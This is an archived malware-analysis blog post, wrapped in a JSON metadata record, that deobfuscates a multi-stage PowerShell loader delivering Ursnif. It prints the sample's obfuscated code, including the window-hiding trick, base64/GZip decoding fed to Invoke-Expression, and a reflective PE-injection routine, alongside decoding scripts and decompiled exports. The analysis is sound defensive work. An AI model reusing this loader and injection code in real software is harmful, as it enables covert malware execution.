{
    "id": "714d30b4-9f43-4401-805e-ae4df5f4463b",
    "created_at": "2023-05-06T02:08:33.754155Z",
    "updated_at": "2025-03-27T02:05:37.586767Z",
    "deleted_at": null,
    "sha1_hash": "bd494aafc42f08c6f885577ca6835d1c4a06bd4b",
    "title": "2023-03-28 - Reversing Complex PowerShell Malware",
    "authors": "",
    "file_creation_date": "2023-05-05T01:45:56Z",
    "file_modification_date": "2023-05-05T01:45:56Z",
    "file_size": 1701241,
    "plain_text": "# Reversing Complex PowerShell Malware\n\n**blog.cerbero.io/**\n\n## In this post we’re going to analyze a multi-stage PowerShell malware, which gives us an opportunity to use our commercial PowerShell Beautifier package and its capability to replace variables.\n\n Sample SHA2-256: 2840D561ED4F949D7D1DADD626E594B9430DEEB399DB5FF53FC0BB1AD30552AA\n\n Interestingly, the malicious script is detected by only 6 out of 58 engines on VirusTotal.\n\n We open the script in Cerbero Suite, decode its content and set the language to PowerShell.\n\n\n-----\n\n## We can observe that the code is obfuscated.\n\n\n-----\n\n```\n# Some body fix this\n\n$OmiltaZ = \"Sh\";\n\n$OmiltaZ += \"owWin\";\n\n$OmiltaZ += \"dow\";\n\n$litoPicomra = \"Get\"\n\n$litoPicomra += \"Current\"\n\n$litoPicomra += \"Process\"\n\n$ifkule = '[DllImport(\"user32.dll\")]'\n\n$ifkule += ' public static extern '\n\n$ifkule += 'bool ShowWi'\n\n$ifkule += 'ndow(int handle, int state);'\n\n$tName = 'Add-T'\n\n$tName += 'ype -name Win -member $i'\n\n$tName += 'fkule -nam'\n\n$tName += 'espace Native'\n\n$tName | iex\n\n$cPr = [System.Diagnostics.Process]::$litoPicomra;\n\n$wndHndl = ($cPr.Invoke() | Get-Process).MainWindowHandle\n\n# Exceptions\n\n[Native.Win]::$OmiltaZ.Invoke($wndHndl, 0)\n\n#\n\n# [operations omitted for brevity]\n\n#\n\n$elem41=$elem41.$dbfbda.Invoke(0,1)\n\n$elem41=$elem41.$casda.Invoke(0,\"H\")\n\n$acdukLom += $elem41\n\n$tp= [System.IO.Compression.CompressionMode]::Decompress\n\n$ss = \"System.\"\n\n$ss += \"IO.Me\"\n\n$ss += \"morySt\"\n\n$ss += \"ream\"\n\n$ftcl = \"read\"\n\n$ftcl += \"toend\"\n\nforeach ($element in $acdukLom) {\n\n  $data = [System.Convert]::FromBase64String($element)\n\n  $ms = New-Object $ss\n\n  $ms.Write($data, 0, $data.Length)\n\n  $ms.Seek(0,0) | Out-Null\n\n  $somObj = New-Object System.IO.Compression.GZipStream($ms, $tp)\n\n  $drD = New-Object System.IO.StreamReader($somObj)\n\n  $vVar = $drD.$ftcl.Invoke()\n\n  $dtPrEr += $vVar\n\n}\n\n```\n\n-----\n\n```\n$scriptPath = $MyInvocation.MyCommand.Path\n\n$dtPrEr | iex\n\n## We launch the PowerShell Beautifier with all options enabled.\n\n The deobfuscated code is easy to follow.\n\n However, there is one glitch in the final loop:\n\n```\n\n-----\n\n```\n$decompress [System.IO.Compression.CompressionMode]::Decompress\n\nforeach ($item in $var_190)\n\n{\n\n  $from_base64_string_result = [System.Convert]::FromBase64String($item)\n\n  $memory_stream = New-Object \"System.IO.MemoryStream\"\n\n  $memory_stream.Write-Output($from_base64_string_result, 0,\n$from_base64_string_result.Length)\n\n  $memory_stream.Seek(0, 0) | Out-Null\n\n  $gzip_stream = New-Object System.IO.Compression.GZipStream($memory_stream,\n$decompress)\n\n  $stream_reader = New-Object System.IO.StreamReader($gzip_stream)\n\n  $readtoend_result = $stream_reader.readtoend()\n\n  $var_197 = \"\" + $readtoend_result # <- here\n\n}\n\n$my_command._path = $MyInvocation.MyCommand.Path\n\n$var_197 | Invoke-Expression\n\n## The replacement of variables ended up handling one line incorrectly. Looking back at the original code:\n$var_197 += $readtoend_result\n\n Therefore, we can adjust the code as follows:\nvar_197 = \"\"\n\n$decompress = [System.IO.Compression.CompressionMode]::Decompress\n\nforeach ($item in $var_190)\n\n{\n\n  $from_base64_string_result = [System.Convert]::FromBase64String($item)\n\n  $memory_stream = New-Object \"System.IO.MemoryStream\"\n\n  $memory_stream.Write-Output($from_base64_string_result, 0,\n$from_base64_string_result.Length)\n\n  $memory_stream.Seek(0, 0) | Out-Null\n\n  $gzip_stream = New-Object System.IO.Compression.GZipStream($memory_stream,\n$decompress)\n\n  $stream_reader = New-Object System.IO.StreamReader($gzip_stream)\n\n  $readtoend_result = $stream_reader.readtoend()\n\n  $var_197 += $readtoend_result\n\n}\n\n$my_command._path = $MyInvocation.MyCommand.Path\n\n$var_197 | Invoke-Expression\n\n The code creates an array of strings:\n'Add-Type -name Win -member $ifkule -namespace Native' | Invoke-Expression\n\n$get_current_process = [System.Diagnostics.Process]::GetCurrentProcess;\n\n$var_15 = ($get_current_process.Invoke() | Get-Process).MainWindowHandle\n\n[Native.Win]::ShowWindow($var_15, 0)\n\n$var_16 = @()\n\n$var_26 = $var_16 + \"H4sIAAAAAAA...\"\n\n```\n\n-----\n\n## It then decodes each string in the array using base64, decompresses the decoded bytes with GZip and then concatenates the end result into one string which is then passed to “Invoke- Expression”.\n\n The following is a small Python script to perform the decoding operations.\n```\nfrom Pro.GZ import *\n\nimport base64\n\ndef deobfuscate(fname):\n\n  with open(fname, \"rb\") as f:\n\n    data = f.read()\n\n  out = bytearray()\n\n  i = 0\n\n  while True:\n\n    i = data.find(b'\"H4', i)\n\n    if i == -1:\n\n      break\n\n    e = data.find(b'\"', i+3)\n\n    s = base64.b64decode(data[i+1:e])\n\n    i = e + 1\n\n    c = NTContainer()\n\n    c.setData(s)\n\n    obj = GZObject()\n\n    obj.Load(c)\n\n    r = obj.GetCompressedRange()\n\n    c = c.clone()\n\n    c.setRange(r.offset, r.size)\n\n    c = applyFilters(c, \"<flts><f name='unpack/zlib' raw='true'/></flts>\", False)\n\n    out += c.read(0, c.size())\n\n  with open(fname + \"_output\", \"wb\") as f:\n\n    f.write(out)\n\n```\n\n-----\n\n## The script takes as input the file name on disk of the beautified PowerShell script and writes out the result of the decoding, which is another PowerShell script.\n\n Even though the code is obfuscated, it is clear that it injects a PE into memory. After having already observed that and extracted the PE, we figured out that probably the PowerShell injection code was lifted from the web. In fact, by searching for an error string we could find a blog post by Joe Bialek, which links to his GitHub repository.\n\n For instance, this is a function in the malware:\n\n\n-----\n\n```\n     Function Copy awgwBB\n\n     {\n\n          Param(\n\n          [Parameter(Position = 0, Mandatory = $true)]\n\n          [Byte[]]\n\n          $LdDataHpo,\n\n          [Parameter(Position = 1, Mandatory = $true)]\n\n          [System.Object]\n\n          $ZpZeTj,\n\n          [Parameter(Position = 2, Mandatory = $true)]\n\n          [System.Object]\n\n          $Win32Functions,\n\n          [Parameter(Position = 3, Mandatory = $true)]\n\n          [System.Object]\n\n          $Win32Types\n\n          )\n\n          for( $i = 0; $i -lt\n$ZpZeTj.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)\n\n          {\n\n              [IntPtr]$SectionHeaderPtr = [IntPtr](Add-HyLchV\n([Int64]$ZpZeTj.SectionHeaderPtr) ($i *\n[System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.tSpqDk)))\n\n              $SectionHeader =\n[System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr,\n[Type]$Win32Types.tSpqDk)\n\n              [IntPtr]$SectionDestAddr = [IntPtr](Add-HyLchV\n([Int64]$ZpZeTj.PEHandle) ([Int64]$SectionHeader.VirtualAddress))\n\n              $SizeOfRawData = $SectionHeader.SizeOfRawData\n\n              if ($SectionHeader.PointerToRawData -eq 0)\n\n              {\n\n                   $SizeOfRawData = 0\n\n              }\n\n              if ($SizeOfRawData -gt $SectionHeader.VirtualSize)\n\n              {\n\n                   $SizeOfRawData = $SectionHeader.VirtualSize\n\n              }\n\n              if ($SizeOfRawData -gt 0)\n\n              {\n\n                   Test-JiHDqn -DebugString \"Copy-awgwBB::MarshalCopy\" ZpZeTj $ZpZeTj -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null\n\n[System.Runtime.InteropServices.Marshal]::Copy($LdDataHpo,\n[Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)\n\n```\n\n-----\n\n```\n              }\n\n              if ($SectionHeader.SizeOfRawData -lt\n$SectionHeader.VirtualSize)\n\n              {\n\n                   $Difference = $SectionHeader.VirtualSize $SizeOfRawData\n\n                   [IntPtr]$StartAddress = [IntPtr](Add-HyLchV\n([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))\n\n                   Test-JiHDqn -DebugString \"Copy-awgwBB::Memset\" ZpZeTj $ZpZeTj -StartAddress $StartAddress -Size $Difference | Out-Null\n\n                   $Win32Functions.memset.Invoke($StartAddress, 0,\n[IntPtr]$Difference) | Out-Null\n\n              }\n\n          }\n\n     }\n\n## And this is the same function in Joe Bialek’s code:\n\n```\n\n-----\n\n```\n     Function Copy Sections\n\n     {\n\n          Param(\n\n          [Parameter(Position = 0, Mandatory = $true)]\n\n          [Byte[]]\n\n          $PEBytes,\n\n          [Parameter(Position = 1, Mandatory = $true)]\n\n          [System.Object]\n\n          $PEInfo,\n\n          [Parameter(Position = 2, Mandatory = $true)]\n\n          [System.Object]\n\n          $Win32Functions,\n\n          [Parameter(Position = 3, Mandatory = $true)]\n\n          [System.Object]\n\n          $Win32Types\n\n          )\n\n          for( $i = 0; $i -lt\n$PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)\n\n          {\n\n              [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned\n([Int64]$PEInfo.SectionHeaderPtr) ($i *\n[System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADE\n\n              $SectionHeader =\n[System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr,\n[Type]$Win32Types.IMAGE_SECTION_HEADER)\n\n              #Address to copy the section to\n\n              [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned\n([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))\n\n              #SizeOfRawData is the size of the data on disk, VirtualSize\nis the minimum space that can be allocated\n\n              #  in memory for the section. If VirtualSize >\nSizeOfRawData, pad the extra spaces with 0. If\n\n              #  SizeOfRawData > VirtualSize, it is because the section\nstored on disk has padding that we can throw away,\n\n              #  so truncate SizeOfRawData to VirtualSize\n\n              $SizeOfRawData = $SectionHeader.SizeOfRawData\n\n              if ($SectionHeader.PointerToRawData -eq 0)\n\n              {\n\n                   $SizeOfRawData = 0\n\n              }\n\n              if ($SizeOfRawData -gt $SectionHeader.VirtualSize)\n\n              {\n\n                   $SizeOfRawData = $SectionHeader.VirtualSize\n\n```\n\n-----\n\n```\n              }\n\n              if ($SizeOfRawData -gt 0)\n\n              {\n\n                   Test-MemoryRangeValid -DebugString \"CopySections::MarshalCopy\" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size\n$SizeOfRawData | Out-Null\n\n[System.Runtime.InteropServices.Marshal]::Copy($PEBytes,\n[Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)\n\n              }\n\n              #If SizeOfRawData is less than VirtualSize, set memory to 0\nfor the extra space\n\n              if ($SectionHeader.SizeOfRawData -lt\n$SectionHeader.VirtualSize)\n\n              {\n\n                   $Difference = $SectionHeader.VirtualSize $SizeOfRawData\n\n                   [IntPtr]$StartAddress = [IntPtr](AddSignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))\n\n                   Test-MemoryRangeValid -DebugString \"CopySections::Memset\" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference |\nOut-Null\n\n                   $Win32Functions.memset.Invoke($StartAddress, 0,\n[IntPtr]$Difference) | Out-Null\n\n              }\n\n          }\n\n     }\n\n## Obfuscation aside, the functions are identical.\n\n In the malicious script the PE is encoded using base64 strings:\n[byte[]] $mbVar\n\n$mbVar += [System.Convert]::FromBase64String(\"qlqQAAMAAAAEAAAA..\")\n\n$mbVar += [System.Convert]::FromBase64String(\"M/9IiXtYS...\")\n\n$mbVar += [System.Convert]::FromBase64String(\"GBBIi/JIi+lyBU2..\");\n\n# etc.\n\n$mbVar1 = [System.Convert]::FromBase64String(\"0KjYqOCo6Kg...\");\n\n$mbVar += $mbVar1\n\n$Wzrnmd = $mbVar\n\n$Wzrnmd[0] = 0x4d\n\n So the scripts decodes many base64 strings, concatenates the result and then replaces the first character of the byte array with 0x4D (which is the ‘M’ character in the “MZ” signature).\n\n We copied the list of base64 operations to a separate file and wrote a small Python script to extract the final PE for us.\n\n```\n\n-----\n\n```\nimport base64\n\ndef deobfuscate(fname):\n\n  with open(fname, \"rb\") as f:\n\n    data = f.read()\n\n  out = bytearray()\n\n  i = 0\n\n  while True:\n\n    i = data.find(b'g(\"', i)\n\n    if i == -1:\n\n      break\n\n    e = data.find(b'\"', i+3)\n\n    out += base64.b64decode(data[i+1:e])\n\n    i = e + 1\n\n  out[0] = 77\n\n  with open(fname + \"_output\", \"wb\") as f:\n\n    f.write(out)\n\n## Now we can analyze the injected PE (SHA2-256: 7751A09B3C1146B5DB72BE1218287DA6FD4C65813A1EB9AE5E0389DB879DAAEB).\n\n```\n\n-----\n\n## The PowerShell scripts calls two methods in the module after it was loaded:\n```\n          if (($ZpZeTj.FileType -ieq \"DLL\") -and ($RemoteProcHandle -eq\n[IntPtr]::Zero))\n\n          {\n\n              [IntPtr]$Jskadx = Get-qRdmSS -PEHandle $PEHandle FunctionName \"kDVMjxaxZYsr\"\n\n              [IntPtr]$PathToSelf = Get-qRdmSS -PEHandle $PEHandle FunctionName \"setPath\"\n\n              $mPth = $global:scriptPath\n\n              $scriptPathPtr =\n[System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($mPth)\n\n              if ($Jskadx -ne [IntPtr]::Zero)\n\n              {\n\n                   $VoidFuncDelegate = Get-yMmHLP @() ([Bool])\n\n                   $VoidFunc = $tVar::$pName.Invoke($Jskadx,\n$VoidFuncDelegate)\n\n                   $VoidSelfDelegate = Get-yMmHLP @([IntPtr]) ([Bool])\n\n                   $VoidSelf = $tVar::$pName.Invoke($PathToSelf,\n$VoidSelfDelegate)\n\n                   $VoidSelf.Invoke($scriptPathPtr)\n\n                   $VoidFunc.Invoke()\n\n              }\n          }\n\n It calls “kDVMjxaxZYsr” and “setPath”. These are also the only exported functions by the module.\n\n```\n\n-----\n\n## Looking at the code of one of the exported functions, we can notice that it just calls an internal function pointer.\n```\nvoid __fastcall setPath(void)\n\n{\n\n  if (*(code **)0x180171460 != (code *)0x0) {\n\n    // WARNING: Could not recover jumptable at 0x00018000104c. Too many branches\n\n    // WARNING: Treating indirect jump as call\n\n    (**(code **)0x180171460)();\n\n    return;\n\n  }\n\n  return;\n\n}\n\n Analyzing the code from the entry point, we see where the function pointer is resolved.\n\n```\n\n-----\n\n```\n*(unk64_t *)0x180171460 = (*_GetProcAddress)(*(int64_t *)0x180171468, \"setPath\");\n\n## Analyzing the code, we noticed that the module loads another module and then resolves the “kDVMjxaxZYsr” and “setPath” from it.\n\n So the module acts just as a proxy to another module and forwards its exports to it.\n\n To find the other module we just searched for the “MZ” string in the hex view. The third hit got us to an embedded PE.\n\n```\n\n-----\n\n## We can, of course, just press Ctrl+E and load the embedded PE, but to be more accurate we first selected the data belonging to the PE. In fact, we know the size of the embedded PE from the following lines:\n```\nvoid __fastcall initDLL(void)\n\n{\n\n  uint64_t payload_base;\n\n  unk64_t payload_size;\n\n  payload_size = 0x169A00;\n\n  payload_base = 0x180007320;\n\n  allocSpecialMemory(100);\n\n  *(int64_t *)0x180171468 = internalLoad(&payload_base);\n\n  if (*(int64_t *)0x180171468 != 0) {\n\n    *(unk64_t *)0x180171458 = (*_GetProcAddress)(*(int64_t *)0x180171468,\n\"dataCheck\");\n\n    *(unk64_t *)0x180171460 = (*_GetProcAddress)(*(int64_t *)0x180171468,\n\"setPath\");\n\n  }\n\n  return;\n\n Hence, we know that the size is 0x169A00 and we press Ctrl+G to select the data.\n\n Now that the data is selected we can load it as an embedded object (Ctrl+E).\n\n```\n\n-----\n\n## The embedded module indeed exports the actual functions which are being called by the proxy module.\n\n The final module (SHA2-256: A41DEED7A7BC99F4B45490E4572114B8CC2DD11F2301D954A59DEE67FA3CCA63) is not obfuscated and can be analyzed.\n\n In the screenshot we can see some anti-reversing checks.\n\n\n-----\n\n## We have uploaded the final payload to VirusTotal and this time more engines detected the threat, although only 28 out of 69.\n\n The name of the malware appears to be “Ursnif”.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-28 - Reversing Complex PowerShell Malware.pdf"
    ],
    "report_names": [
        "2023-03-28 - Reversing Complex PowerShell Malware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1683338913,
    "ts_updated_at": 1743041137,
    "ts_creation_date": 1683251156,
    "ts_modification_date": 1683251156,
    "files": {
        "pdf": "https://archive.orkl.eu/bd494aafc42f08c6f885577ca6835d1c4a06bd4b.pdf",
        "text": "https://archive.orkl.eu/bd494aafc42f08c6f885577ca6835d1c4a06bd4b.txt",
        "img": "https://archive.orkl.eu/bd494aafc42f08c6f885577ca6835d1c4a06bd4b.jpg"
    }
}